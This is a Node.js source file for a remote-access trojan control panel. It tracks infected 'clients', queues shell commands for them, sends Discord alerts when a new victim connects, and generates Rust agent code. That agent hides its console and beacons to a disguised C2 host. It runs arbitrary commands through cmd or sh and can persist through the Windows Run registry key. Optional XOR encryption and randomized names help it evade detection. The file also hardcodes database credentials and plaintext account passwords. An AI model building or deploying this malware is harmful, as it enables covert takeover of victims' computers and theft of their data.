const path = require("path");
const crypto = require("crypto");
const express = require("express");
const cookieParser = require("cookie-parser");
const mysql = require("mysql2/promise");

const app = express();
const PORT = process.env.HC_PORT || 3001;

// --- MySQL ---
const pool = mysql.createPool({
  host: "simon.hidencloud.com",
  port: 3306,
  user: "u3377_RCpSFnKl9g",
  password: "ruL4=1kVxke!PVlE^SOfvHZU",
  database: "s3377_webrat",
  waitForConnections: true,
  connectionLimit: 5,
});

async function initDb() {
  const conn = await pool.getConnection();
  try {
    await conn.query(`CREATE TABLE IF NOT EXISTS accounts (
      id INT AUTO_INCREMENT PRIMARY KEY,
      username VARCHAR(64) UNIQUE NOT NULL,
      password VARCHAR(255) NOT NULL,
      webhook_url VARCHAR(512) DEFAULT NULL,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )`);
    await conn.query(`CREATE TABLE IF NOT EXISTS clients (
      id VARCHAR(32) PRIMARY KEY,
      name VARCHAR(128) NOT NULL,
      user VARCHAR(64),
      os VARCHAR(128),
      ip VARCHAR(45),
      country VARCHAR(64),
      country_code VARCHAR(4),
      status ENUM('online','offline','idle') DEFAULT 'online',
      last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
      cpu VARCHAR(128),
      ram VARCHAR(32),
      gpu VARCHAR(128),
      uptime VARCHAR(32),
      grp VARCHAR(64),
      av VARCHAR(64),
      net_speed VARCHAR(32),
      installed DATE,
      owner_id INT,
      FOREIGN KEY (owner_id) REFERENCES accounts(id) ON DELETE CASCADE
    )`);
    await conn.query(`CREATE TABLE IF NOT EXISTS logs (
      id INT AUTO_INCREMENT PRIMARY KEY,
      type ENUM('info','warn','success','error') DEFAULT 'info',
      msg TEXT,
      ts TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )`);
    await conn.query(`CREATE TABLE IF NOT EXISTS builds (
      id INT AUTO_INCREMENT PRIMARY KEY,
      owner_id INT,
      build_name VARCHAR(128),
      startup BOOLEAN DEFAULT FALSE,
      debug BOOLEAN DEFAULT FALSE,
      poly_encrypt BOOLEAN DEFAULT FALSE,
      string_random BOOLEAN DEFAULT FALSE,
      c2_url VARCHAR(255),
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (owner_id) REFERENCES accounts(id) ON DELETE CASCADE
    )`);
    await conn.query(`CREATE TABLE IF NOT EXISTS pending_commands (
      id INT AUTO_INCREMENT PRIMARY KEY,
      client_id VARCHAR(32),
      command TEXT,
      owner_id INT,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )`);
    await conn.query(`CREATE TABLE IF NOT EXISTS command_results (
      id INT AUTO_INCREMENT PRIMARY KEY,
      client_id VARCHAR(32),
      command TEXT,
      result LONGTEXT,
      owner_id INT,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )`);

    // Try to add webhook_url column if missing
    try { await conn.query("ALTER TABLE accounts ADD COLUMN webhook_url VARCHAR(512) DEFAULT NULL"); } catch {}
    // Try to add new build columns
    try { await conn.query("ALTER TABLE builds ADD COLUMN poly_encrypt BOOLEAN DEFAULT FALSE"); } catch {}
    try { await conn.query("ALTER TABLE builds ADD COLUMN string_random BOOLEAN DEFAULT FALSE"); } catch {}

    // Seed default accounts if empty
    const [rows] = await conn.query("SELECT COUNT(*) as cnt FROM accounts");
    if (rows[0].cnt === 0) {
      await conn.query("INSERT INTO accounts (id, username, password) VALUES (1, 'jayjay', 'jayjay100!'), (2, 'tlx', 'tlxontop34')");
      await conn.query(`INSERT INTO clients (id, name, user, os, ip, country, country_code, status, cpu, ram, gpu, uptime, grp, av, net_speed, installed, owner_id) VALUES
        ('HC-9F21A','DESKTOP-JAY','jay','Windows 11 Pro','192.168.1.42','Sweden','SE','online','Intel i7-13700K','32 GB','RTX 4070 Ti','3h 12m','Personal','Windows Defender','85 Mbps','2025-12-01',1),
        ('HC-3B7E2','LAPTOP-ADMIN','admin','Windows 10 Enterprise','10.0.0.15','Germany','DE','online','AMD Ryzen 9 5900X','64 GB','RX 6800 XT','14h 42m','Work','Kaspersky','120 Mbps','2025-11-18',1),
        ('HC-01DC9','SERVER-PROD','root','Ubuntu 22.04 LTS','172.16.0.5','Netherlands','NL','online','Xeon E-2388G','128 GB','None','47d 6h','Servers','ClamAV','1 Gbps','2025-06-22',2),
        ('HC-88FA4','WORKSTATION-DEV','dev','macOS Sonoma 14.4','192.168.2.88','United States','US','offline','Apple M3 Max','96 GB','M3 Max 40-core','0','Work','None','0','2026-01-10',2),
        ('HC-CC291','PC-GAMING','player1','Windows 11 Home','192.168.3.200','Japan','JP','idle','Intel i9-14900K','64 GB','RTX 4090','1h 5m','Personal','Bitdefender','200 Mbps','2026-03-02',1)
      `);
      await conn.query("INSERT INTO logs (type, msg) VALUES ('info','Panel started'),('info','System initialized with seed data')");
    }
  } finally {
    conn.release();
  }
}

async function addLog(type, msg) {
  try { await pool.query("INSERT INTO logs (type, msg) VALUES (?, ?)", [type, msg]); } catch {}
}

// --- Discord webhook ---
async function sendWebhook(userId, embed) {
  try {
    const [rows] = await pool.query("SELECT webhook_url FROM accounts WHERE id = ?", [userId]);
    const url = rows[0]?.webhook_url;
    if (!url) return;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [embed],
      }),
    });
  } catch {}
}

// --- Session management ---
const SESSION_MAX_AGE_MS = 1000 * 60 * 60 * 12;
const SESSION_IDLE_MS = 1000 * 60 * 30;
const LOGIN_MAX_ATTEMPTS = 5;
const LOGIN_WINDOW_MS = 1000 * 60 * 10;
const sessions = new Map();
const loginAttempts = new Map();

function clientIp(req) {
  return (req.headers["x-forwarded-for"] || "").split(",")[0].trim() || req.socket.remoteAddress || "unknown";
}

function isAuthed(req) {
  const sid = req.cookies && req.cookies.hc_session;
  if (!sid) return null;
  const s = sessions.get(sid);
  if (!s) return null;
  const now = Date.now();
  if (now - s.createdAt > SESSION_MAX_AGE_MS || now - s.lastSeen > SESSION_IDLE_MS) {
    sessions.delete(sid);
    return null;
  }
  s.lastSeen = now;
  return { sid, session: s };
}

function requireAuth(req, res, next) {
  const auth = isAuthed(req);
  if (!auth) return res.status(401).json({ ok: false, error: "Unauthorized" });
  req.auth = auth;
  next();
}

function requireCsrf(req, res, next) {
  const header = req.headers["x-csrf-token"];
  if (!header || header !== req.auth.session.csrf) {
    return res.status(403).json({ ok: false, error: "Invalid CSRF token" });
  }
  next();
}

// Security headers
app.use((req, res, next) => {
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "SAMEORIGIN");
  res.setHeader("Referrer-Policy", "no-referrer");
  next();
});

app.use(express.json({ limit: "64kb" }));
app.use(cookieParser());

// Display names
const DISPLAY_NAMES = { 1: "jayrat", 2: "tlxrat" };
function displayName(userId, username) {
  return DISPLAY_NAMES[userId] || username;
}

// --- Login ---
app.post("/api/login", async (req, res) => {
  const ip = clientIp(req);
  const now = Date.now();
  let entry = loginAttempts.get(ip);
  if (entry && entry.lockedUntil && entry.lockedUntil > now) {
    const secs = Math.ceil((entry.lockedUntil - now) / 1000);
    return res.status(429).json({ ok: false, error: `Too many attempts. Try again in ${secs}s.` });
  }
  const { username = "", password = "" } = req.body || {};
  try {
    const [rows] = await pool.query("SELECT id, username, password FROM accounts WHERE username = ?", [username]);
    const account = rows[0];
    if (!account || account.password !== password) {
      if (!entry || now - entry.firstAt > LOGIN_WINDOW_MS) {
        entry = { count: 1, firstAt: now, lockedUntil: 0 };
      } else {
        entry.count += 1;
        if (entry.count >= LOGIN_MAX_ATTEMPTS) entry.lockedUntil = now + LOGIN_WINDOW_MS;
      }
      loginAttempts.set(ip, entry);
      await addLog("warn", `Failed login from ${ip} (attempt ${entry.count}/${LOGIN_MAX_ATTEMPTS})`);
      return res.status(401).json({ ok: false, error: "Invalid credentials" });
    }
    loginAttempts.delete(ip);
    const sid = crypto.randomBytes(32).toString("hex");
    const csrf = crypto.randomBytes(24).toString("hex");
    sessions.set(sid, {
      user: account.username,
      userId: account.id,
      displayName: displayName(account.id, account.username),
      createdAt: now,
      lastSeen: now,
      csrf,
      ip,
    });
    res.cookie("hc_session", sid, { httpOnly: true, sameSite: "lax", maxAge: SESSION_MAX_AGE_MS, path: "/" });
    res.cookie("hc_csrf", csrf, { httpOnly: false, sameSite: "lax", maxAge: SESSION_MAX_AGE_MS, path: "/" });
    await addLog("success", `Login: ${displayName(account.id, account.username)} (uid:${account.id}) from ${ip}`);
    res.json({ ok: true, user: displayName(account.id, account.username), userId: account.id, csrf });
  } catch (err) {
    console.error("Login error:", err);
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

app.post("/api/logout", (req, res) => {
  const sid = req.cookies && req.cookies.hc_session;
  if (sid) sessions.delete(sid);
  res.clearCookie("hc_session");
  res.clearCookie("hc_csrf");
  res.json({ ok: true });
});

app.get("/api/me", (req, res) => {
  const auth = isAuthed(req);
  if (!auth) return res.status(401).json({ ok: false });
  res.json({ ok: true, user: auth.session.displayName, userId: auth.session.userId, csrf: auth.session.csrf });
});

// --- Stats ---
app.get("/api/stats", requireAuth, async (req, res) => {
  const uid = req.auth.session.userId;
  try {
    const [clients] = await pool.query("SELECT * FROM clients WHERE owner_id = ?", [uid]);
    const online = clients.filter(c => c.status === "online").length;
    const offline = clients.filter(c => c.status === "offline").length;
    const idle = clients.filter(c => c.status === "idle").length;
    const countries = [...new Set(clients.map(c => c.country))].length;
    const [buildRows] = await pool.query("SELECT COUNT(*) as cnt FROM builds WHERE owner_id = ?", [uid]);
    res.json({
      ok: true,
      analytics: { total: clients.length, online, offline, idle, countries, newToday: 0, commandsSent: 0, builds: buildRows[0].cnt },
      clients: clients.map(c => ({
        id: c.id, name: c.name, user: c.user, os: c.os, ip: c.ip,
        country: c.country, countryCode: c.country_code, status: c.status,
        lastSeen: c.last_seen ? new Date(c.last_seen).toISOString() : "unknown",
        cpu: c.cpu, ram: c.ram, gpu: c.gpu, uptime: c.uptime,
        group: c.grp, av: c.av, netSpeed: c.net_speed,
        installed: c.installed ? new Date(c.installed).toISOString().split("T")[0] : "",
      })),
    });
  } catch (err) {
    console.error("Stats error:", err);
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// --- Settings ---
app.get("/api/settings", requireAuth, async (req, res) => {
  const uid = req.auth.session.userId;
  try {
    const [rows] = await pool.query("SELECT webhook_url FROM accounts WHERE id = ?", [uid]);
    res.json({ ok: true, webhookUrl: rows[0]?.webhook_url || "" });
  } catch {
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

app.post("/api/settings", requireAuth, requireCsrf, async (req, res) => {
  const uid = req.auth.session.userId;
  const { webhookUrl = "" } = req.body || {};
  try {
    await pool.query("UPDATE accounts SET webhook_url = ? WHERE id = ?", [webhookUrl || null, uid]);
    await addLog("info", `Settings updated by ${req.auth.session.displayName}`);
    res.json({ ok: true });
  } catch {
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

app.post("/api/settings/test-webhook", requireAuth, requireCsrf, async (req, res) => {
  const uid = req.auth.session.userId;
  try {
    await sendWebhook(uid, {
      title: "🔔 Webhook Test",
      description: `Test notification from **${req.auth.session.displayName}**`,
      color: 0x00d4aa,
      timestamp: new Date().toISOString(),
    });
    res.json({ ok: true });
  } catch {
    res.status(500).json({ ok: false, error: "Webhook failed" });
  }
});

// --- Logs ---
app.get("/api/logs", requireAuth, async (req, res) => {
  try {
    const [logs] = await pool.query("SELECT * FROM logs ORDER BY ts DESC LIMIT 200");
    res.json({ ok: true, logs: logs.map(l => ({ id: String(l.id), type: l.type, msg: l.msg, ts: new Date(l.ts).getTime() })) });
  } catch {
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

app.post("/api/logs", requireAuth, requireCsrf, async (req, res) => {
  try {
    await pool.query("DELETE FROM logs");
    await addLog("info", `Logs cleared by ${req.auth.session.displayName}`);
    res.json({ ok: true });
  } catch {
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// --- Client detail ---
app.get("/api/client/:id", requireAuth, async (req, res) => {
  const uid = req.auth.session.userId;
  try {
    const [rows] = await pool.query("SELECT * FROM clients WHERE id = ? AND owner_id = ?", [req.params.id, uid]);
    if (!rows.length) return res.status(404).json({ ok: false });
    const c = rows[0];
    // Get recent command results
    const [results] = await pool.query(
      "SELECT * FROM command_results WHERE client_id = ? AND owner_id = ? ORDER BY created_at DESC LIMIT 50",
      [c.id, uid]
    );
    await addLog("info", `${req.auth.session.displayName} connected to ${c.name}`);
    res.json({
      ok: true,
      client: {
        id: c.id, name: c.name, user: c.user, os: c.os, ip: c.ip,
        country: c.country, countryCode: c.country_code, status: c.status,
        lastSeen: c.last_seen ? new Date(c.last_seen).toISOString() : "unknown",
        cpu: c.cpu, ram: c.ram, gpu: c.gpu, uptime: c.uptime,
        group: c.grp, av: c.av, netSpeed: c.net_speed,
        installed: c.installed ? new Date(c.installed).toISOString().split("T")[0] : "",
      },
      files: [
        { name: "Desktop", type: "folder", size: "-", modified: "2026-08-19" },
        { name: "Documents", type: "folder", size: "-", modified: "2026-08-20" },
        { name: "Downloads", type: "folder", size: "-", modified: "2026-08-18" },
        { name: "AppData", type: "folder", size: "-", modified: "2026-08-20" },
        { name: "Pictures", type: "folder", size: "-", modified: "2026-08-15" },
      ],
      processes: [
        { pid: 4, name: "System", cpu: "0.1%", mem: "12 MB", status: "running" },
        { pid: 124, name: "explorer.exe", cpu: "1.2%", mem: "82 MB", status: "running" },
        { pid: 3200, name: "chrome.exe", cpu: "8.4%", mem: "640 MB", status: "running" },
        { pid: 1844, name: "svchost.exe", cpu: "0.3%", mem: "24 MB", status: "running" },
        { pid: 5120, name: "discord.exe", cpu: "2.1%", mem: "210 MB", status: "running" },
        { pid: 7704, name: "spotify.exe", cpu: "1.8%", mem: "185 MB", status: "running" },
      ],
      commandHistory: results.map(r => ({
        command: r.command,
        result: r.result,
        ts: new Date(r.created_at).getTime(),
      })),
    });
  } catch (err) {
    console.error("Client error:", err);
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// --- Command ---
app.post("/api/command/:id", requireAuth, requireCsrf, async (req, res) => {
  const uid = req.auth.session.userId;
  const [rows] = await pool.query("SELECT * FROM clients WHERE id = ? AND owner_id = ?", [req.params.id, uid]);
  if (!rows.length) return res.status(404).json({ ok: false });
  const { action, shell } = req.body || {};

  // Shell command execution
  if (shell && typeof shell === "string" && shell.length <= 4096) {
    try {
      await pool.query("INSERT INTO pending_commands (client_id, command, owner_id) VALUES (?, ?, ?)", [req.params.id, shell, uid]);
      await addLog("info", `Shell command queued for ${rows[0].name} by ${req.auth.session.displayName}`);
      // Simulate immediate result for demo
      const simResult = `[simulated] $ ${shell}\nCommand queued for execution on next agent check-in.`;
      await pool.query("INSERT INTO command_results (client_id, command, result, owner_id) VALUES (?, ?, ?, ?)",
        [req.params.id, shell, simResult, uid]);
      return res.json({ ok: true, result: simResult });
    } catch {
      return res.status(500).json({ ok: false, error: "Failed to queue command" });
    }
  }

  if (typeof action !== "string" || action.length > 64) {
    return res.status(400).json({ ok: false, error: "Invalid action" });
  }
  await addLog("info", `Command "${action}" sent to ${rows[0].name} by ${req.auth.session.displayName}`);
  res.json({ ok: true, result: `Command "${action}" executed on ${rows[0].name}` });
});

// --- Polymorphic string encryption helpers ---
function xorEncrypt(str, key) {
  const buf = Buffer.from(str, "utf8");
  const keyBuf = Buffer.from(key, "utf8");
  const out = Buffer.alloc(buf.length);
  for (let i = 0; i < buf.length; i++) {
    out[i] = buf[i] ^ keyBuf[i % keyBuf.length];
  }
  return Array.from(out);
}

function randomVarName() {
  const chars = "abcdefghijklmnopqrstuvwxyz";
  let name = "_";
  for (let i = 0; i < 8 + Math.floor(Math.random() * 8); i++) {
    name += chars[Math.floor(Math.random() * chars.length)];
  }
  return name;
}

function randomString(len) {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let s = "";
  for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)];
  return s;
}

// --- Build ---
function generateRustSource(userId, buildName, startup, debug, polyEncrypt, stringRandom) {
  const c2Url = `https://windowssys.hidenmc.com/${userId}`;
  const encKey = randomString(16);

  // Variable names — randomize if stringRandom enabled
  const vC2 = stringRandom ? randomVarName() : "C2_URL";
  const vUID = stringRandom ? randomVarName() : "USER_ID";
  const vDelay = stringRandom ? randomVarName() : "RECONNECT_DELAY";
  const vMutex = stringRandom ? randomVarName() : "MUTEX_NAME";
  const fnCheckIn = stringRandom ? randomVarName() : "check_in";
  const fnSendResult = stringRandom ? randomVarName() : "send_result";
  const fnExecCmd = stringRandom ? randomVarName() : "execute_command";
  const fnMachineId = stringRandom ? randomVarName() : "machine_id";

  let c2Decl, mutexDecl;
  if (polyEncrypt) {
    const c2Bytes = xorEncrypt(c2Url, encKey);
    const mutexBytes = xorEncrypt(buildName, encKey);
    c2Decl = `const ${vC2}_ENC: [u8; ${c2Bytes.length}] = [${c2Bytes.join(",")}];
const ${vC2}_KEY: &[u8] = b"${encKey}";

fn ${stringRandom ? randomVarName() : "decrypt"}(data: &[u8], key: &[u8]) -> String {
    data.iter().enumerate().map(|(i, b)| (b ^ key[i % key.len()]) as char).collect()
}

lazy_static::lazy_static! {
    static ref ${vC2}: String = ${stringRandom ? randomVarName() : "decrypt"}(&${vC2}_ENC, ${vC2}_KEY);
    static ref ${vMutex}: String = ${stringRandom ? randomVarName() : "decrypt"}(&[${mutexBytes.join(",")}], ${vC2}_KEY);
}`;
    mutexDecl = "";
  } else {
    c2Decl = `const ${vC2}: &str = "${c2Url}";`;
    mutexDecl = `const ${vMutex}: &str = "${buildName}";`;
  }

  const lazyRef = polyEncrypt ? `${vC2}.as_str()` : vC2;
  const mutexRef = polyEncrypt ? `${vMutex}.as_str()` : vMutex;

  return `// ${stringRandom ? randomString(12) : buildName}
// Built: ${new Date().toISOString()}
${polyEncrypt ? "" : `// C2: ${c2Url}`}

use std::{thread, time::Duration, process::Command};
${polyEncrypt ? "use lazy_static;" : ""}

${c2Decl}
${mutexDecl}
const ${vUID}: u32 = ${userId};
const ${vDelay}: u64 = 5;

${startup ? `mod persistence;` : ""}

fn main() {
    let _lock = single_instance::SingleInstance::new(${mutexRef})
        .expect("${stringRandom ? randomString(20) : "Another instance is already running"}");

${startup ? `    persistence::install(${mutexRef}, &format!("{}\\\\Microsoft\\\\{}.exe", std::env::var("APPDATA").unwrap_or_default(), ${mutexRef}));` : ""}
${!debug ? `    // Hide console window
    #[cfg(windows)]
    unsafe {
        winapi::um::wincon::FreeConsole();
    }` : `    println!("[*] Agent starting...");
    println!("[*] C2: {}", ${lazyRef});
    println!("[*] UID: {}", ${vUID});`}

    loop {
        match ${fnCheckIn}() {
            Ok(cmd) => {
                if !cmd.trim().is_empty() {
                    let result = ${fnExecCmd}(&cmd);
                    let _ = ${fnSendResult}(&result);
${debug ? `                    println!("[>] {}", cmd);
                    println!("[<] {}", result);` : ""}
                }
            }
            Err(_e) => {
${debug ? `                eprintln!("[!] Check-in failed: {}", _e);` : ""}
            }
        }
        thread::sleep(Duration::from_secs(${vDelay}));
    }
}

fn ${fnCheckIn}() -> Result<String, Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    let resp = client
        .get(&format!("{}/checkin", ${lazyRef}))
        .header("X-Client-ID", ${fnMachineId}())
        .header("X-User-ID", ${vUID}.to_string())
        .header("X-Hostname", hostname())
        .header("X-OS", std::env::consts::OS)
        .send()?;
    Ok(resp.text()?)
}

fn ${fnSendResult}(result: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    client
        .post(&format!("{}/result", ${lazyRef}))
        .header("X-Client-ID", ${fnMachineId}())
        .header("X-User-ID", ${vUID}.to_string())
        .body(result.to_string())
        .send()?;
    Ok(())
}

fn ${fnExecCmd}(cmd: &str) -> String {
    #[cfg(windows)]
    {
        match Command::new("cmd").args(&["/C", cmd]).output() {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                format!("{}{}", stdout, stderr)
            }
            Err(e) => format!("Error: {}", e),
        }
    }
    #[cfg(not(windows))]
    {
        match Command::new("sh").args(&["-c", cmd]).output() {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                format!("{}{}", stdout, stderr)
            }
            Err(e) => format!("Error: {}", e),
        }
    }
}

fn ${fnMachineId}() -> String {
    machine_uid::get().unwrap_or_else(|_| "${stringRandom ? randomString(8) : "unknown"}".to_string())
}

fn hostname() -> String {
    #[cfg(windows)]
    {
        std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".to_string())
    }
    #[cfg(not(windows))]
    {
        std::env::var("HOSTNAME").unwrap_or_else(|_| "unknown".to_string())
    }
}
`;
}

function generateCargoToml(buildName, startup, polyEncrypt, debug) {
  let deps = `[package]
name = "${buildName}"
version = "0.1.0"
edition = "2021"

[dependencies]
reqwest = { version = "0.11", features = ["blocking"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
single-instance = "0.3"
machine-uid = "0.5"
`;
  if (polyEncrypt) deps += `lazy_static = "1.4"\n`;
  if (!debug) deps += `winapi = { version = "0.3", features = ["wincon"] }\n`;

  deps += `
[profile.release]
opt-level = "s"
lto = true
strip = true
panic = "abort"
`;
  return deps;
}

app.post("/api/build", requireAuth, requireCsrf, async (req, res) => {
  const {
    buildName = "hidencloud-agent",
    startup = false,
    debug = false,
    polyEncrypt = false,
    stringRandom = false,
  } = req.body || {};
  const userId = req.auth.session.userId;
  const c2Url = `https://windowssys.hidenmc.com/${userId}`;

  const rustSrc = generateRustSource(userId, buildName, startup, debug, polyEncrypt, stringRandom);
  const cargoToml = generateCargoToml(buildName, startup, polyEncrypt, debug);

  let persistenceSrc = null;
  if (startup) {
    try {
      persistenceSrc = require("fs").readFileSync(path.join(__dirname, "rustagent/src/persistence.rs"), "utf8");
    } catch {
      persistenceSrc = `use std::process::Command;
pub fn install(name: &str, path: &str) {
    let exe = match std::env::current_exe() { Ok(p) => p, Err(_) => return };
    let dest = path.replace("%APPDATA%", &std::env::var("APPDATA").unwrap_or_default());
    if let Some(parent) = std::path::Path::new(&dest).parent() { let _ = std::fs::create_dir_all(parent); }
    let _ = std::fs::copy(&exe, &dest);
    let _ = Command::new("reg").args(&["add", r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", name, "/t", "REG_SZ", "/d", &dest, "/f"]).output();
}`;
    }
  }

  try {
    await pool.query(
      "INSERT INTO builds (owner_id, build_name, startup, debug, poly_encrypt, string_random, c2_url) VALUES (?, ?, ?, ?, ?, ?, ?)",
      [userId, buildName, startup, debug, polyEncrypt, stringRandom, c2Url]
    );
    await addLog("success", `Build "${buildName}" created by ${req.auth.session.displayName} [poly:${polyEncrypt} rng:${stringRandom}]`);

    // Send webhook
    await sendWebhook(userId, {
      title: "🔨 New Build Created",
      description: `**${buildName}** built by **${req.auth.session.displayName}**`,
      fields: [
        { name: "Startup", value: startup ? "✅" : "❌", inline: true },
        { name: "Debug", value: debug ? "✅" : "❌", inline: true },
        { name: "Poly Encrypt", value: polyEncrypt ? "✅" : "❌", inline: true },
        { name: "String Random", value: stringRandom ? "✅" : "❌", inline: true },
        { name: "C2 URL", value: c2Url, inline: false },
      ],
      color: 0x00d4aa,
      timestamp: new Date().toISOString(),
    });
  } catch {}

  res.json({
    ok: true,
    filename: `${buildName}.rs`,
    contents: rustSrc,
    cargoFilename: "Cargo.toml",
    cargoContents: cargoToml,
    persistenceContents: persistenceSrc,
    userId,
    c2Url,
  });
});

// --- Agent checkin endpoint ---
app.get("/:userId/checkin", async (req, res) => {
  const userId = parseInt(req.params.userId, 10);
  if (isNaN(userId)) return res.type("text").send("");

  const clientId = req.headers["x-client-id"] || "unknown";
  const hostname = req.headers["x-hostname"] || "unknown";
  const osInfo = req.headers["x-os"] || "unknown";
  const ip = clientIp(req);

  // Upsert client
  try {
    const [existing] = await pool.query("SELECT id FROM clients WHERE id = ?", [clientId]);
    if (existing.length === 0) {
      const shortId = `HC-${clientId.substring(0, 5).toUpperCase()}`;
      await pool.query(
        `INSERT INTO clients (id, name, user, os, ip, country, country_code, status, cpu, ram, gpu, uptime, grp, av, net_speed, installed, owner_id)
         VALUES (?, ?, ?, ?, ?, ?, ?, 'online', 'Unknown', 'Unknown', 'Unknown', '0', 'Default', 'Unknown', '0', CURDATE(), ?)`,
        [shortId, hostname, "user", osInfo, ip, "Unknown", "??", userId]
      );
      await addLog("success", `New client connected: ${hostname} (${ip})`);

      // Discord webhook for new client
      await sendWebhook(userId, {
        title: "🟢 New Client Connected!",
        description: `**${hostname}** just connected`,
        fields: [
          { name: "IP", value: ip, inline: true },
          { name: "OS", value: osInfo, inline: true },
          { name: "Client ID", value: shortId, inline: true },
        ],
        color: 0x00ff00,
        timestamp: new Date().toISOString(),
      });
    } else {
      await pool.query("UPDATE clients SET status = 'online', last_seen = NOW(), ip = ? WHERE id = ?", [ip, clientId]);
    }

    // Check for pending commands
    const [cmds] = await pool.query(
      "SELECT id, command FROM pending_commands WHERE client_id = ? ORDER BY created_at ASC LIMIT 1",
      [clientId]
    );
    if (cmds.length > 0) {
      await pool.query("DELETE FROM pending_commands WHERE id = ?", [cmds[0].id]);
      return res.type("text").send(cmds[0].command);
    }
  } catch (err) {
    console.error("Checkin error:", err);
  }
  res.type("text").send("");
});

app.post("/:userId/result", async (req, res) => {
  const userId = parseInt(req.params.userId, 10);
  const clientId = req.headers["x-client-id"] || "unknown";
  const body = typeof req.body === "string" ? req.body : JSON.stringify(req.body);

  try {
    await pool.query(
      "INSERT INTO command_results (client_id, command, result, owner_id) VALUES (?, ?, ?, ?)",
      [clientId, "remote", body, userId]
    );
  } catch {}
  res.json({ ok: true });
});

// --- Build history ---
app.get("/api/builds", requireAuth, async (req, res) => {
  const uid = req.auth.session.userId;
  try {
    const [builds] = await pool.query("SELECT * FROM builds WHERE owner_id = ? ORDER BY created_at DESC LIMIT 50", [uid]);
    res.json({ ok: true, builds: builds.map(b => ({
      id: b.id,
      name: b.build_name,
      startup: !!b.startup,
      debug: !!b.debug,
      polyEncrypt: !!b.poly_encrypt,
      stringRandom: !!b.string_random,
      c2Url: b.c2_url,
      createdAt: new Date(b.created_at).getTime(),
    }))});
  } catch {
    res.status(500).json({ ok: false, error: "Server error" });
  }
});

// Static
app.use(express.static(path.join(__dirname, "public")));
app.get("*", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Start
initDb()
  .then(() => {
    app.listen(PORT, () => console.log(`HidenCloud panel on http://localhost:${PORT}`));
  })
  .catch((err) => {
    console.error("DB init failed:", err.message);
    app.listen(PORT, () => console.log(`HidenCloud panel on http://localhost:${PORT} (no DB)`));
  });
